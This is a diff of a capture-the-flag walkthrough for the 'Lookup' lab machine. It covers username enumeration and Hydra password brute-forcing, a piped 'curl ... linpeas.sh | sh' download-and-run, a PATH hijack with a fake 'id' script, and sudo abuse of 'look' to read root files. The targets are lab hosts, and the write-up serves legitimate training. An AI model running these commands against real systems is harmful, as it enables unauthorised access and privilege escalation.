@@ -1,10 +1,18 @@
-** DRAFT ** 
+- [[#Test your enumeration skills on this boot-to-root machine.|Test your enumeration skills on this boot-to-root machine.]]
+- [[#Initial Reconnaissance|Initial Reconnaissance]]
+- [[#What is the user flag?|What is the user flag?]]
+- [[#What is the root flag?|What is the root flag?]]
+- [[#Summary|Summary]]
+- [[#Full logging / output|Full logging / output]]
+	- [[#Full logging / output#Creating the files txt files into a single file, just encase we needed to use it|Creating the files txt files into a single file, just encase we needed to use it]]
+	- [[#Full logging / output#full linpeas|full linpeas]]
+	- [[#Full logging / output#Full STRACE|Full STRACE]]
 
-# Test your enumeration skills on this boot-to-root machine.
+##  Test your enumeration skills on this boot-to-root machine.
 
 **Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.
 
-# Initial Reconnaissance
+##  Initial Reconnaissance
 
 * Finding open services with nmap, tried a few different scan types but didn't finder more services 
 ```
@@ -24,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 379.84 seconds
 ```
 
 
-* http://10.10.215.104 loads http://lookup.thm but no page loads, adding to host file and we get a login page
+* http://10.10.215.104 redirects to http://lookup.thm but no page loads, adding to host file and we get a login page
 
 ```
 sudo nano /etc/hosts 
@@ -92,12 +100,12 @@ dig lookup.thm ANY
 ```
 
 
-# What is the user flag?
+## What is the user flag?
 
-Attempting to login with random data gives us, 
+Attempting to webpage login with random data gives us error
 **Wrong username or password. Please try again.**
 
-Can we enumerate username? just testing common usernames manaully found admin gives us 
+Can we enumerate username? testing common usernames manaully found admin gives us 
 **Wrong password. Please try again.**
 
 This suggests we can enumerate usernames due to difference in error messages. Attempting to brute force admin with 
@@ -119,18 +127,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 21:26:
 
 ```
 
-Although when we try to login we get error **Wrong username or password. Please try again.**
+gives us a password found, although when we try to login we get error **Wrong username or password. Please try again.**
 
 This maybe suggest there is another user that has the password **password123** and there is some logic issues for username/password checking. 
 
 Back to username emulation, we pull down a names list with,
 ```
-https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt
 ```
 
 Then 
 ```
-hydra -L username.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=password123:Wrong" 
+hydra -L names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=password123:Wrong" 
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -143,14 +151,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 21:30:
 [STATUS] 731.29 tries/min, 5119 tries in 00:07h, 5058 to do in 00:07h, 16 active     
 ```
 
-Yes we can login with jose, and we get directed to files.lookup.thm which we need to add to our host file.
+We find username jose and we can login with jose. once logged in we get directed to files.lookup.thm which we need to add to our host file.
 
 ```
 sudo nano /etc/hosts 
 10.10.215.104 lookup.thm files.lookup.thm
 ```
 
-Now we get a page lFinder with random txt files, does have an about page,  
+Now we get a page lFinder web application with random txt files, does have an about page,  
 
 ```
 elFinder
@@ -341,7 +349,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 ```
 
-lets see what linpeas.sh suggests, does suggest /usr/sbin/pwm is not a common / known file so might be it. not having much luck with gtfobins and other files. 
+linpeas.sh suggests suggests /usr/sbin/pwm is not a common / known file so might be it. not having much luck with gtfobins and other files. 
 https://gtfobins.github.io/gtfobins
 
 ```
@@ -381,7 +389,7 @@ running pwm gives us
 
 ```
 
-Lets try pull down to reverse engineer locally 
+I think pwm = Password Manager? Lets try pull down to reverse engineer locally using a python web server
 ```
 cp /usr/sbin/pwm /tmp
 cd /tmp
@@ -396,7 +404,7 @@ On kali
 wget http://lookup.thm:8000/pwm  
 ```
 
-We can run locally 
+We can run locally on kali
 ```
 └─$ /home/kali/pwm                                                            
 [!] Running 'id' command to extract the username and user ID (UID)
@@ -421,7 +429,7 @@ hello
 
 ```
 
-ChatGPT of a strace of pwm (think pwm = Password Manager?) full strace provided after the summary 
+ChatGPT of a strace of pwm, full strace provided after the summary 
 
 ```
 ### 1. **Starts normally**
@@ -444,8 +452,7 @@ openat(AT_FDCWD, "/home/kali/.passwords", O_RDONLY) read(3, "lost\nhello\n", 409
 
 So if we can make id return think, it should return thinks .passwords,
 
-Nice, we add to Path so we can create a id within tmp? 
-
+Confirmed we can add to Path, 
 ```
 echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@@ -455,7 +462,9 @@ echo $PATH
 
 ```
 
-We can use id to confirm what our fake id needs to return, 
+This means we can create our own id within tmp that tricks pwm to report we are user think, then as PWM has sudo will be able to open thinks .password file and read back to us.
+
+To do this, we can use the real id to confirm what our fake id needs to return, 
 
 ```
 id
@@ -587,11 +596,11 @@ think@lookup:~$ cat /home/think/user.txt
 
 ```
 
-# What is the root flag?
+## What is the root flag?
 
-That first flag was hard, lets hope this is not as bad, 
+That first flag was hard, lets hope this flag is not as bad, 
 
-does think have any sudo commands? yes look
+does think have any sudo commands? yes, /usr/bin/look
 
 ```
 think@lookup:~$ sudo -l
@@ -609,6 +618,7 @@ User think may run the following commands on lookup:
 
 ```
 
+gtfobins helps out here,
 ```
 https://gtfobins.github.io/gtfobins/look/
 LFILE=file_to_read
@@ -619,7 +629,6 @@ We can guess the root flag location,
 ```
 think@lookup:~$ sudo /usr/bin/look '' /root/root.txt
 5a285a9****************18e8
-
 ```
 
 Although is there another way? 
@@ -707,12 +716,12 @@ root@lookup:~#
 
 ```
 
+## Summary
 
-# Summary
+Wow, that one had a bit of everything — definitely harder than most of the easy challenges, but a lot of fun and a great way to bring all those techniques together.
 
-Wow, that one had a bit of everything — definitely harder than most of the easy challenges, but a lot of fun and a great way to bring all those techniques together
-
-# Creating the files txt files into a single file, just encase we needed to use it
+## Full logging / output
+### Creating the elFinder txt files into a single file, just encase we needed to use it
 ```
 cd /var/www/files.lookup.thm/public_html/elFinder/files
 
@@ -823,7 +832,7 @@ superconductor
 ```
 
 
-# full linpeas
+### full linpeas
 ```
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -2406,40 +2415,7 @@ Regexes to search for API keys aren't activated, use param '-r'
 
 ```
 
-
-https://gtfobins.github.io/gtfobins/look/
-
-```
-echo "#!/bin/bash\necho \"uid=33(think), gid=33(think) groups=33(think)\"" > /tmp/id
-chmod +x /tmp/id
-
-```
-
-
-```
-think@lookup:~$ sudo -l
-[sudo] password for think: 
-Sorry, try again.
-[sudo] password for think: 
-Matching Defaults entries for think on lookup:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User think may run the following commands on lookup:
-    (ALL) /usr/bin/look
-
-```
-
-
-
-```
-
-
-
-```
-
-
-
-## Full STRACE
+### Full STRACE
 
 ```
 strace -f /home/kali/pwm     
